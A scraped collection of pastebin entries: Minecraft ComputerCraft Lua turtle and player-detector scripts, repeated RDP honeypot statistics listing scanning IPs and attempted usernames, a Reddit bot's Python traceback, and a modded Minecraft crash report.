            print(""ERROR: Out of dirt. Cannot continue."")
            return false
        end
        if not turtle.placeDown() then
            print(""ERROR: Failed to place dirt even after selecting."")
            return false
        end
    end

    print(""Placed dirt below."")
    return true
end

-- Move forward with digging if needed
local function forward()
    while not turtle.forward() do
        print(""Blocked. Digging forward..."")
        turtle.dig()
        sleep(0.5)
    end
end

-- Move up with digging if needed
local function moveUp()
    while not turtle.up() do
        print(""Blocked above. Digging up..."")
        turtle.digUp()
        sleep(0.5)
    end
end

-- Build one horizontal layer
local function buildLayer(layerNum)
    print(""Starting layer ""..layerNum..""..."")
    for w = 1, width do
        for l = 1, length do
            if not placeDown() then
                print(""Stopping layer due to placement failure."")
                return false
            end
            if l < length then
                forward()
            end
        end

        -- Move to next row
        if w < width then
            if w % 2 == 1 then
                turtle.turnRight()
                forward()
                turtle.turnRight()
            else
                turtle.turnLeft()
                forward()
                turtle.turnLeft()
            end
        end
    end

    -- Return to starting row direction
    if width % 2 == 1 then
        turtle.turnRight()
        for i = 1, length - 1 do forward() end
        turtle.turnRight()
    else
        turtle.turnLeft()
        for i = 1, length - 1 do forward() end
        turtle.turnLeft()
    end

    print(""Finished layer ""..layerNum..""."")
    return true
end

-- Build all layers
for h = 1, height do
    if not buildLayer(h) then
        print(""Build aborted on layer ""..h)
        return
    end
    if h < height then
        print(""Moving up to layer ""..(h + 1))
        moveUp()
    end
end

print(""✅ Build complete! All ""..height.."" layer(s) placed."")
"
xWzXzNy3,2025-06-13_stats.json,rdp_snitch,JSON,Saturday 14th of June 2025 07:18:25 PM CDT,"{
  ""ip"": {
    ""14.194.131.202"": 12015,
    ""209.97.152.8"": 4893,
    ""80.66.79.30"": 16362,
    ""24.173.30.170"": 1365,
    ""194.165.16.165"": 6,
    ""91.238.181.91"": 6,
    ""198.235.24.239"": 9,
    ""147.182.199.204"": 6,
    ""167.172.131.118"": 11016,
    ""138.68.188.52"": 12,
    ""199.45.154.156"": 3,
    ""165.154.0.19"": 18,
    ""206.168.34.118"": 3,
    ""193.142.146.227"": 9,
    ""174.138.27.235"": 9,
    ""103.82.22.120"": 12,
    ""92.63.197.23"": 15,
    ""198.235.24.48"": 9,
    ""2.57.121.247"": 6,
    ""31.43.185.41"": 9,
    ""139.59.97.137"": 1389,
    ""161.35.213.124"": 3,
    ""178.128.21.189"": 5352,
    ""157.230.248.35"": 1002,
    ""198.55.98.79"": 3,
    ""198.235.24.205"": 9,
    ""146.190.167.180"": 3,
    ""194.180.49.127"": 3,
    ""194.165.16.164"": 6,
    ""91.238.181.96"": 6,
    ""81.29.134.51"": 3,
    ""45.55.52.60"": 3,
    ""205.210.31.71"": 9
  },
  ""asn"": {
    ""AS45820"": 12015,
    ""AS14061"": 23688,
    ""AS60602"": 16362,
    ""AS11427"": 1365,
    ""AS48721"": 12,
    ""AS49434"": 12,
    ""AS396982"": 36,
    ""AS398722"": 3,
    ""AS135377"": 18,
    ""AS398324"": 3,
    ""AS213438"": 9,
    ""AS135905"": 12,
    ""AS210848"": 15,
    ""AS47890"": 6,
    ""AS211736"": 9,
    ""AS214940"": 3,
    ""AS201814"": 3,
    ""AS12555"": 3
  },
  ""isp"": {
    ""Tata Tele Services GSM"": 12015,
    ""DigitalOcean, LLC"": 22299,
    ""HYPER-HOSTING"": 16362,
    ""Charter Communications Inc"": 1365,
    ""Flyservers S.A."": 12,
    ""Datacenter location PAR1 France"": 12,
    ""Google LLC"": 36,
    ""Censys, Inc."": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 18,
    ""ColocaTel Inc."": 9,
    ""Vietnam Posts and Telecommunications Group"": 12,
    ""Telkom Internet LTD"": 15,
    ""Unmanaged LTD"": 6,
    ""FOP Dmytro Nedilskyi"": 9,
    ""DIGITALOCEAN"": 1389,
    ""HostPapa"": 3,
    ""MEVSPACE sp. z o.o."": 3,
    ""Data-center IMAQLIQ Ltd."": 3
  },
  ""org"": {
    ""Unknown"": 28377,
    ""DigitalOcean, LLC"": 18333,
    ""Spectrum"": 1365,
    ""Flyservers S.A"": 12,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Palo Alto Networks, Inc"": 36,
    ""Censys, Inc."": 6,
    ""Ucloud Information Technology (hk) Limited"": 18,
    ""ColocaTel Inc"": 9,
    ""Unica Academy Joint Stock Company"": 12,
    ""Korotkij Denis Aleksandrovich"": 15,
    ""Unmanaged LTD"": 6,
    ""FOP Dmytro Nedilskyi"": 9,
    ""Digitalocean"": 5352,
    ""Virtualine Technologies"": 3,
    ""HostSlick"": 3,
    ""DC Imaqliq"": 3,
    ""Digital Ocean"": 3
  },
  ""regionName"": {
    ""Gujarat"": 12015,
    ""New Jersey"": 15912,
    ""Chi\u0219in\u0103u Municipality"": 16362,
    ""Texas"": 1365,
    ""Kaunas"": 12,
    ""\u00cele-de-France"": 12,
    ""California"": 45,
    ""England"": 18,
    ""New York"": 3,
    ""Kowloon"": 18,
    ""Illinois"": 3,
    ""North Holland"": 24,
    ""South West"": 7752,
    ""Hanoi"": 12,
    ""Kyiv City"": 9,
    ""Hesse"": 3,
    ""South Carolina"": 3,
    ""Bavaria"": 3,
    ""Moscow"": 3
  },
  ""country"": {
    ""India"": 12015,
    ""United States"": 17331,
    ""Moldova"": 16362,
    ""Lithuania"": 12,
    ""France"": 12,
    ""United Kingdom"": 18,
    ""Hong Kong"": 18,
    ""The Netherlands"": 24,
    ""Singapore"": 7752,
    ""Vietnam"": 12,
    ""Ukraine"": 9,
    ""Germany"": 6,
    ""Russia"": 3
  },
  ""account"": {
    ""hello"": 53460,
    ""Test"": 24,
    ""ntiYFeXDx"": 3,
    ""DpdWaK"": 3,
    ""cZCKeI"": 3,
    ""(empty)"": 12,
    ""Domain"": 18,
    ""Administr"": 24,
    ""tRCwvVrUD"": 3,
    ""ZVYkJL"": 3,
    ""JbaRYM"": 3,
    ""xCeevWDEX"": 3,
    ""olfhoC"": 3,
    ""GGyAXv"": 3,
    ""cmyPsaryN"": 3,
    ""EbJOON"": 3,
    ""yMOojd"": 3
  },
  ""keyboard"": {
    ""Unknown"": 53574
  },
  ""client_build"": {
    ""Unknown"": 53574
  },
  ""client_name"": {
    ""Unknown"": 53574
  },
  ""ip_type"": {
    ""Unknown"": 13455,
    ""hosting"": 40119
  }
}"
ykrQ60u2,2025-06-13_stats.json,rdp_snitch,JSON,Saturday 14th of June 2025 07:16:28 PM CDT,"{
  ""ip"": {
    ""14.194.131.202"": 12013,
    ""209.97.152.8"": 4892,
    ""80.66.79.30"": 16361,
    ""24.173.30.170"": 1365,
    ""194.165.16.165"": 6,
    ""91.238.181.91"": 6,
    ""198.235.24.239"": 9,
    ""147.182.199.204"": 6,
    ""167.172.131.118"": 11016,
    ""138.68.188.52"": 12,
    ""199.45.154.156"": 3,
    ""165.154.0.19"": 18,
    ""206.168.34.118"": 3,
    ""193.142.146.227"": 9,
    ""174.138.27.235"": 9,
    ""103.82.22.120"": 12,
    ""92.63.197.23"": 15,
    ""198.235.24.48"": 9,
    ""2.57.121.247"": 6,
    ""31.43.185.41"": 9,
    ""139.59.97.137"": 1389,
    ""161.35.213.124"": 3,
    ""178.128.21.189"": 5352,
    ""157.230.248.35"": 1002,
    ""198.55.98.79"": 3,
    ""198.235.24.205"": 9,
    ""146.190.167.180"": 3,
    ""194.180.49.127"": 3,
    ""194.165.16.164"": 6,
    ""91.238.181.96"": 6,
    ""81.29.134.51"": 3,
    ""45.55.52.60"": 3,
    ""205.210.31.71"": 9
  },
  ""asn"": {
    ""AS45820"": 12013,
    ""AS14061"": 23687,
    ""AS60602"": 16361,
    ""AS11427"": 1365,
    ""AS48721"": 12,
    ""AS49434"": 12,
    ""AS396982"": 36,
    ""AS398722"": 3,
    ""AS135377"": 18,
    ""AS398324"": 3,
    ""AS213438"": 9,
    ""AS135905"": 12,
    ""AS210848"": 15,
    ""AS47890"": 6,
    ""AS211736"": 9,
    ""AS214940"": 3,
    ""AS201814"": 3,
    ""AS12555"": 3
  },
  ""isp"": {
    ""Tata Tele Services GSM"": 12013,
    ""DigitalOcean, LLC"": 22298,
    ""HYPER-HOSTING"": 16361,
    ""Charter Communications Inc"": 1365,
    ""Flyservers S.A."": 12,
    ""Datacenter location PAR1 France"": 12,
    ""Google LLC"": 36,
    ""Censys, Inc."": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 18,
    ""ColocaTel Inc."": 9,
    ""Vietnam Posts and Telecommunications Group"": 12,
    ""Telkom Internet LTD"": 15,
    ""Unmanaged LTD"": 6,
    ""FOP Dmytro Nedilskyi"": 9,
    ""DIGITALOCEAN"": 1389,
    ""HostPapa"": 3,
    ""MEVSPACE sp. z o.o."": 3,
    ""Data-center IMAQLIQ Ltd."": 3
  },
  ""org"": {
    ""Unknown"": 28374,
    ""DigitalOcean, LLC"": 18332,
    ""Spectrum"": 1365,
    ""Flyservers S.A"": 12,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Palo Alto Networks, Inc"": 36,
    ""Censys, Inc."": 6,
    ""Ucloud Information Technology (hk) Limited"": 18,
    ""ColocaTel Inc"": 9,
    ""Unica Academy Joint Stock Company"": 12,
    ""Korotkij Denis Aleksandrovich"": 15,
    ""Unmanaged LTD"": 6,
    ""FOP Dmytro Nedilskyi"": 9,
    ""Digitalocean"": 5352,
    ""Virtualine Technologies"": 3,
    ""HostSlick"": 3,
    ""DC Imaqliq"": 3,
    ""Digital Ocean"": 3
  },
  ""regionName"": {
    ""Gujarat"": 12013,
    ""New Jersey"": 15911,
    ""Chi\u0219in\u0103u Municipality"": 16361,
    ""Texas"": 1365,
    ""Kaunas"": 12,
    ""\u00cele-de-France"": 12,
    ""California"": 45,
    ""England"": 18,
    ""New York"": 3,
    ""Kowloon"": 18,
    ""Illinois"": 3,
    ""North Holland"": 24,
    ""South West"": 7752,
    ""Hanoi"": 12,
    ""Kyiv City"": 9,
    ""Hesse"": 3,
    ""South Carolina"": 3,
    ""Bavaria"": 3,
    ""Moscow"": 3
  },
  ""country"": {
    ""India"": 12013,
    ""United States"": 17330,
    ""Moldova"": 16361,
    ""Lithuania"": 12,
    ""France"": 12,
    ""United Kingdom"": 18,
    ""Hong Kong"": 18,
    ""The Netherlands"": 24,
    ""Singapore"": 7752,
    ""Vietnam"": 12,
    ""Ukraine"": 9,
    ""Germany"": 6,
    ""Russia"": 3
  },
  ""account"": {
    ""hello"": 53456,
    ""Test"": 24,
    ""ntiYFeXDx"": 3,
    ""DpdWaK"": 3,
    ""cZCKeI"": 3,
    ""(empty)"": 12,
    ""Domain"": 18,
    ""Administr"": 24,
    ""tRCwvVrUD"": 3,
    ""ZVYkJL"": 3,
    ""JbaRYM"": 3,
    ""xCeevWDEX"": 3,
    ""olfhoC"": 3,
    ""GGyAXv"": 3,
    ""cmyPsaryN"": 3,
    ""EbJOON"": 3,
    ""yMOojd"": 3
  },
  ""keyboard"": {
    ""Unknown"": 53570
  },
  ""client_build"": {
    ""Unknown"": 53570
  },
  ""client_name"": {
    ""Unknown"": 53570
  },
  ""ip_type"": {
    ""Unknown"": 13453,
    ""hosting"": 40117
  }
}"
Zij0pBPA,2025-06-13_stats.json,rdp_snitch,JSON,Saturday 14th of June 2025 07:15:16 PM CDT,"{
  ""ip"": {
    ""14.194.131.202"": 12011,
    ""209.97.152.8"": 4891,
    ""80.66.79.30"": 16360,
    ""24.173.30.170"": 1365,
    ""194.165.16.165"": 6,
    ""91.238.181.91"": 6,
    ""198.235.24.239"": 9,
    ""147.182.199.204"": 6,
    ""167.172.131.118"": 11016,
    ""138.68.188.52"": 12,
    ""199.45.154.156"": 3,
    ""165.154.0.19"": 18,
    ""206.168.34.118"": 3,
    ""193.142.146.227"": 9,
    ""174.138.27.235"": 9,
    ""103.82.22.120"": 12,
    ""92.63.197.23"": 15,
    ""198.235.24.48"": 9,
    ""2.57.121.247"": 6,
    ""31.43.185.41"": 9,
    ""139.59.97.137"": 1389,
    ""161.35.213.124"": 3,
    ""178.128.21.189"": 5352,
    ""157.230.248.35"": 1002,
    ""198.55.98.79"": 3,
    ""198.235.24.205"": 9,
    ""146.190.167.180"": 3,
    ""194.180.49.127"": 3,
    ""194.165.16.164"": 6,
    ""91.238.181.96"": 6,
    ""81.29.134.51"": 3,
    ""45.55.52.60"": 3,
    ""205.210.31.71"": 9
  },
  ""asn"": {
    ""AS45820"": 12011,
    ""AS14061"": 23686,
    ""AS60602"": 16360,
    ""AS11427"": 1365,
    ""AS48721"": 12,
    ""AS49434"": 12,
    ""AS396982"": 36,
    ""AS398722"": 3,
    ""AS135377"": 18,
    ""AS398324"": 3,
    ""AS213438"": 9,
    ""AS135905"": 12,
    ""AS210848"": 15,
    ""AS47890"": 6,
    ""AS211736"": 9,
    ""AS214940"": 3,
    ""AS201814"": 3,
    ""AS12555"": 3
  },
  ""isp"": {
    ""Tata Tele Services GSM"": 12011,
    ""DigitalOcean, LLC"": 22297,
    ""HYPER-HOSTING"": 16360,
    ""Charter Communications Inc"": 1365,
    ""Flyservers S.A."": 12,
    ""Datacenter location PAR1 France"": 12,
    ""Google LLC"": 36,
    ""Censys, Inc."": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 18,
    ""ColocaTel Inc."": 9,
    ""Vietnam Posts and Telecommunications Group"": 12,
    ""Telkom Internet LTD"": 15,
    ""Unmanaged LTD"": 6,
    ""FOP Dmytro Nedilskyi"": 9,
    ""DIGITALOCEAN"": 1389,
    ""HostPapa"": 3,
    ""MEVSPACE sp. z o.o."": 3,
    ""Data-center IMAQLIQ Ltd."": 3
  },
  ""org"": {
    ""Unknown"": 28371,
    ""DigitalOcean, LLC"": 18331,
    ""Spectrum"": 1365,
    ""Flyservers S.A"": 12,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Palo Alto Networks, Inc"": 36,
    ""Censys, Inc."": 6,
    ""Ucloud Information Technology (hk) Limited"": 18,
    ""ColocaTel Inc"": 9,
    ""Unica Academy Joint Stock Company"": 12,
    ""Korotkij Denis Aleksandrovich"": 15,
    ""Unmanaged LTD"": 6,
    ""FOP Dmytro Nedilskyi"": 9,
    ""Digitalocean"": 5352,
    ""Virtualine Technologies"": 3,
    ""HostSlick"": 3,
    ""DC Imaqliq"": 3,
    ""Digital Ocean"": 3
  },
  ""regionName"": {
    ""Gujarat"": 12011,
    ""New Jersey"": 15910,
    ""Chi\u0219in\u0103u Municipality"": 16360,
    ""Texas"": 1365,
    ""Kaunas"": 12,
    ""\u00cele-de-France"": 12,
    ""California"": 45,
    ""England"": 18,
    ""New York"": 3,
    ""Kowloon"": 18,
    ""Illinois"": 3,
    ""North Holland"": 24,
    ""South West"": 7752,
    ""Hanoi"": 12,
    ""Kyiv City"": 9,
    ""Hesse"": 3,
    ""South Carolina"": 3,
    ""Bavaria"": 3,
    ""Moscow"": 3
  },
  ""country"": {
    ""India"": 12011,
    ""United States"": 17329,
    ""Moldova"": 16360,
    ""Lithuania"": 12,
    ""France"": 12,
    ""United Kingdom"": 18,
    ""Hong Kong"": 18,
    ""The Netherlands"": 24,
    ""Singapore"": 7752,
    ""Vietnam"": 12,
    ""Ukraine"": 9,
    ""Germany"": 6,
    ""Russia"": 3
  },
  ""account"": {
    ""hello"": 53452,
    ""Test"": 24,
    ""ntiYFeXDx"": 3,
    ""DpdWaK"": 3,
    ""cZCKeI"": 3,
    ""(empty)"": 12,
    ""Domain"": 18,
    ""Administr"": 24,
    ""tRCwvVrUD"": 3,
    ""ZVYkJL"": 3,
    ""JbaRYM"": 3,
    ""xCeevWDEX"": 3,
    ""olfhoC"": 3,
    ""GGyAXv"": 3,
    ""cmyPsaryN"": 3,
    ""EbJOON"": 3,
    ""yMOojd"": 3
  },
  ""keyboard"": {
    ""Unknown"": 53566
  },
  ""client_build"": {
    ""Unknown"": 53566
  },
  ""client_name"": {
    ""Unknown"": 53566
  },
  ""ip_type"": {
    ""Unknown"": 13451,
    ""hosting"": 40115
  }
}"
VYtmZrSc,RequestException: error with request,basedcount_bot,Python,Saturday 14th of June 2025 06:58:20 PM CDT,"Traceback (most recent call last):
  File ""/home/gmktec-server/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/home/gmktec-server/Bots/basedcount_bot/basedcount_bot.py"", line 294, in read_comments
    await comment.reply(reply_message)
  File ""/home/gmktec-server/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/reddit/mixins/replyable.py"", line 46, in reply
    comments = await self._reddit.post(API_PATH[""comment""], data=data)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 946, in post
    return await self._objectify_request(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 570, in _objectify_request
    await self.request(
  File ""/home/gmktec-server/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 1061, in request
    return await self._core.request(
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 383, in request
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 286, in _request_with_retries
    response, saved_exception = await self._make_request(
                                ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 192, in _make_request
    response = await self._rate_limiter.call(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/rate_limit.py"", line 51, in call
    response = await request_function(*args, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/requestor.py"", line 80, in request
    raise RequestException(exc, args, kwargs) from None
asyncprawcore.exceptions.RequestException: error with request 
"
98Bf7s9z,Door detector,Mastergannel,Lua,Saturday 14th of June 2025 06:40:24 PM CDT,"-- Player Detector script to pulse redstone when a player enters or leaves a defined area
-- Version: 0.1
-- Coordinates: From (-2947, 176, 2546) to (-2941, 178, 2549)
-- Redstone output: Right side of the computer
-- Peripheral: Player Detector on the left side

-- Wrap the Player Detector peripheral
local detector = peripheral.find(""playerDetector"")
if not detector then
    error(""Player Detector not found on the left side. Please ensure it is attached."")
end

-- Define the detection area coordinates
local posOne = {x = -2947, y = 176, z = 2540}
local posTwo = {x = -2950, y = 178, z = 2546}

-- Pulse duration in seconds
local pulseDuration = 0.2

-- Redstone output side
local outputSide = ""right""

-- Function to send a redstone pulse
local function pulseRedstone()
    redstone.setOutput(outputSide, true)
    sleep(pulseDuration)
    redstone.setOutput(outputSide, false)
end

-- Main loop to monitor player presence
local wasPlayerPresent = false -- Tracks previous state
while true do
    -- Check if any player is in the defined area
    local isPlayerPresent = detector.isPlayersInCoords(posOne, posTwo)
    
    -- Detect player entering (false -> true)
    if isPlayerPresent and not wasPlayerPresent then
        print(""Player entered the area. Pulsing redstone..."")
        pulseRedstone()
    
    -- Detect player leaving (true -> false)
    elseif not isPlayerPresent and wasPlayerPresent then
        print(""Player left the area. Pulsing redstone..."")
        pulseRedstone()
    end
    
    -- Update the previous state
    wasPlayerPresent = isPlayerPresent
    
    -- Sleep to prevent excessive CPU usage
    sleep(0.2)
end"
rCqhEbG3,asgtyre,McBaron,Lua,Saturday 14th of June 2025 06:29:47 PM CDT,"-- Fill Area with Dirt using a Turtle

-- Function to ask for a number
local function askForNumber(prompt)
    print(prompt)
    local input = read()
    return tonumber(input)
end

-- Prompt user for dimensions
local length = askForNumber(""Enter length:"")
local width = askForNumber(""Enter width:"")
local height = askForNumber(""Enter height:"")

-- Select dirt in inventory (first found slot)
local function selectDirt()
    for i = 1, 16 do
        turtle.select(i)
        local item = turtle.getItemDetail()
        if item and item.name:find(""dirt"") then
            return true
        end
    end
    return false
end

-- Place a block below the turtle
local function placeDown()
    if not turtle.detectDown() then
        if not turtle.placeDown() then
            if not selectDirt() then
                print(""Out of dirt!"")
                return false
            end
            if not turtle.placeDown() then
                print(""Failed to place dirt."")
                return false
            end
        end
    end
    return true
end

-- Move forward with obstacle handling
local function forward()
    while not turtle.forward() do
        turtle.dig()
        sleep(0.5)
    end
end

-- Build one horizontal layer
local function buildLayer()
    for w = 1, width do
        for l = 1, length do
            placeDown()
            if l < length then
                forward()
            end
        end
        -- Move to next row
        if w < width then
            if w % 2 == 1 then
                turtle.turnRight()
                forward()
                turtle.turnRight()
            else
                turtle.turnLeft()
                forward()
                turtle.turnLeft()
            end
        end
    end

    -- Return to starting position of the layer
    if width % 2 == 1 then
        turtle.turnRight()
        for i = 1, width - 1 do forward() end
        turtle.turnRight()
    else
        if width > 1 then
            if width % 2 == 0 then
                turtle.turnLeft()
                for i = 1, width - 1 do forward() end
                turtle.turnLeft()
            end
        end
    end
end

-- Main loop: build each layer
for h = 1, height do
    buildLayer()
    if h < height then
        while not turtle.up() do
            turtle.digUp()
            sleep(0.5)
        end
    end
end

print(""Done building!"")
"
C3Naxpwp,crash-report,WDgaster390191,Java,Saturday 14th of June 2025 06:15:33 PM CDT,"---- Minecraft Crash Report ----
// Shall we play a game?

Time: 2025-06-14 16:11:34
Description: Mod loading failures have occurred; consult the issue messages for more details

net.neoforged.neoforge.logging.CrashReportExtender$ModLoadingCrashException: Mod loading has failed


A detailed walkthrough of the error, its code path and all known details is as follows:
---------------------------------------------------------------------------------------

-- Head --
Thread: Render thread
Stacktrace:
	at TRANSFORMER/mekanismscience@1.4/com.fxd927.mekanismscience.common.registries.MSCreativeTab.<clinit>(MSCreativeTab.java:15) ~[?:?] {re:classloading}
-- Mod loading issue for: mekanismscience --
Details:
	Mod file: /C:/Users/0wdga/AppData/Roaming/ATLauncher/instances/OriTech/mods/MekanismSciece-1.21.1-1.4.jar
	Failure message: Mekanism: Science (mekanismscience) has failed to load correctly
		java.lang.NoSuchMethodError: 'mekanism.common.registration.MekanismDeferredHolder mekanism.common.registration.impl.CreativeTabDeferredRegister.registerMain(mekanism.api.text.ILangEntry, mekanism.api.providers.IItemProvider, java.util.function.UnaryOperator)'
	Mod version: 1.4
	Mod issues URL: <No issues URL found>
	Exception message: java.lang.NoSuchMethodError: 'mekanism.common.registration.MekanismDeferredHolder mekanism.common.registration.impl.CreativeTabDeferredRegister.registerMain(mekanism.api.text.ILangEntry, mekanism.api.providers.IItemProvider, java.util.function.UnaryOperator)'
Stacktrace:
	at TRANSFORMER/mekanismscience@1.4/com.fxd927.mekanismscience.common.registries.MSCreativeTab.<clinit>(MSCreativeTab.java:15) ~[MekanismSciece-1.21.1-1.4.jar%23390!/:?] {re:classloading}
	at TRANSFORMER/mekanismscience@1.4/com.fxd927.mekanismscience.common.MekanismScience.<init>(MekanismScience.java:28) ~[MekanismSciece-1.21.1-1.4.jar%23390!/:?] {re:classloading}
	at java.base/jdk.internal.reflect.DirectConstructorHandleAccessor.newInstance(DirectConstructorHandleAccessor.java:62) ~[?:?] {}
	at java.base/java.lang.reflect.Constructor.newInstanceWithCaller(Constructor.java:502) ~[?:?] {}
	at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:486) ~[?:?] {}
	at MC-BOOTSTRAP/fml_loader@4.0.39/net.neoforged.fml.javafmlmod.FMLModContainer.constructMod(FMLModContainer.java:115) ~[loader-4.0.39.jar%23107!/:4.0] {}
	at MC-BOOTSTRAP/fml_loader@4.0.39/net.neoforged.fml.ModLoader.lambda$constructMods$3(ModLoader.java:153) ~[loader-4.0.39.jar%23107!/:4.0] {re:mixin}
	at MC-BOOTSTRAP/fml_loader@4.0.39/net.neoforged.fml.ModLoader.lambda$dispatchParallelTask$7(ModLoader.java:231) ~[loader-4.0.39.jar%23107!/:4.0] {re:mixin}
	at java.base/java.util.concurrent.CompletableFuture.uniHandle(CompletableFuture.java:934) ~[?:?] {re:mixin}
	at java.base/java.util.concurrent.CompletableFuture$UniHandle.tryFire(CompletableFuture.java:911) ~[?:?] {}
	at java.base/java.util.concurrent.CompletableFuture$Completion.exec(CompletableFuture.java:483) ~[?:?] {}
	at java.base/java.util.concurrent.ForkJoinTask.doExec(ForkJoinTask.java:387) ~[?:?] {}
	at java.base/java.util.concurrent.ForkJoinPool$WorkQueue.topLevelExec(ForkJoinPool.java:1312) ~[?:?] {}
	at java.base/java.util.concurrent.ForkJoinPool.scan(ForkJoinPool.java:1843) ~[?:?] {re:mixin,re:computing_frames}
	at java.base/java.util.concurrent.ForkJoinPool.runWorker(ForkJoinPool.java:1808) ~[?:?] {re:mixin,re:computing_frames}
	at java.base/java.util.concurrent.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:188) ~[?:?] {re:mixin}


-- System Details --
Details:
	Minecraft Version: 1.21.1
	Minecraft Version ID: 1.21.1
	Operating System: Windows 11 (amd64) version 10.0
	Java Version: 21.0.7, Microsoft
	Java VM Version: OpenJDK 64-Bit Server VM (mixed mode), Microsoft
	Memory: 331310824 bytes (315 MiB) / 1744830464 bytes (1664 MiB) up to 5368709120 bytes (5120 MiB)
	CPUs: 12
	Processor Vendor: AuthenticAMD
	Processor Name: AMD Ryzen 5 5600G with Radeon Graphics         
	Identifier: AuthenticAMD Family 25 Model 80 Stepping 0
	Microarchitecture: Zen 3
	Frequency (GHz): 3.89
	Number of physical packages: 1
	Number of physical CPUs: 6
	Number of logical CPUs: 12
	Graphics card #0 name: AMD Radeon RX 6600 XT
	Graphics card #0 vendor: Advanced Micro Devices, Inc.
	Graphics card #0 VRAM (MiB): 8176.00
	Graphics card #0 deviceId: VideoController1
	Graphics card #0 versionInfo: 32.0.21013.1000
	Memory slot #0 capacity (MiB): 8192.00
	Memory slot #0 clockSpeed (GHz): 3.20
	Memory slot #0 type: DDR4
	Virtual memory max (MiB): 20815.18
	Virtual memory used (MiB): 13322.61
	Swap memory total (MiB): 12734.32
	Swap memory used (MiB): 456.95
	Space in storage for jna.tmpdir (MiB): available: 62827.91, total: 476136.00
	Space in storage for org.lwjgl.system.SharedLibraryExtractPath (MiB): available: 62827.91, total: 476136.00
	Space in storage for io.netty.native.workdir (MiB): available: 62827.91, total: 476136.00
	Space in storage for java.io.tmpdir (MiB): available: 62827.91, total: 476136.00
	Space in storage for workdir (MiB): available: 62827.91, total: 476136.00
	JVM Flags: 10 total; -Xmx5120M -XX:MetaspaceSize=256M -XX:+UnlockExperimentalVMOptions -XX:+UseG1GC -XX:G1NewSizePercent=20 -XX:G1ReservePercent=20 -XX:MaxGCPauseMillis=50 -XX:G1HeapRegionSize=32M -XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.exe.heapdump -Xss1M
	ModLauncher: 11.0.5+main.901c6ea8
	ModLauncher launch target: forgeclient
	ModLauncher services: 
		sponge-mixin-0.15.2+mixin.0.8.7.jar mixin PLUGINSERVICE 
		loader-4.0.39.jar slf4jfixer PLUGINSERVICE 
		loader-4.0.39.jar runtime_enum_extender PLUGINSERVICE 
		at-modlauncher-10.0.1.jar accesstransformer PLUGINSERVICE 
		loader-4.0.39.jar runtimedistcleaner PLUGINSERVICE 
		modlauncher-11.0.5.jar mixin TRANSFORMATIONSERVICE 
		modlauncher-11.0.5.jar fml TRANSFORMATIONSERVICE 
	FML Language Providers: 
		kotlinforforge@5.8.0
		__fabric_loader_bootstrap@2.5.29+0.16.0+1.21
		javafml@4.0
		lowcodefml@4.0
		minecraft@4.0
	Mod List: 
		AdvancementPlaques-1.21.1-neoforge-1.6.8.jar      |Advancement Plaques           |advancementplaques            |1.6.8               |Manifest: NOSIGNATURE
		AI-Improvements-1.21-0.5.3.jar                    |AI-Improvements               |aiimprovements                |0.5.3               |Manifest: NOSIGNATURE
		alltheleaks-0.1.17-beta+1.21.1-neoforge.jar       |All The Leaks                 |alltheleaks                   |0.1.17-beta+1.21.1-n|Manifest: NOSIGNATURE
		almanac-1.21.x-neoforge-1.0.2.jar                 |Almanac                       |almanac                       |1.0.2               |Manifest: NOSIGNATURE
		almostunified-neoforge-1.21.1-1.2.6.jar           |AlmostUnified                 |almostunified                 |1.21.1-1.2.6        |Manifest: NOSIGNATURE
		amendments-1.21-1.2.24-neoforge.jar               |Amendments                    |amendments                    |1.21-1.2.24         |Manifest: NOSIGNATURE
		appleskin-neoforge-mc1.21-3.0.7.jar               |AppleSkin                     |appleskin                     |3.0.7+mc1.21        |Manifest: NOSIGNATURE
		appliedenergistics2-19.2.12.jar                   |Applied Energistics 2         |ae2                           |19.2.12             |Manifest: NOSIGNATURE
		Applied-Mekanistics-1.6.2.jar                     |Applied Mekanistics           |appmek                        |1.6.2               |Manifest: NOSIGNATURE
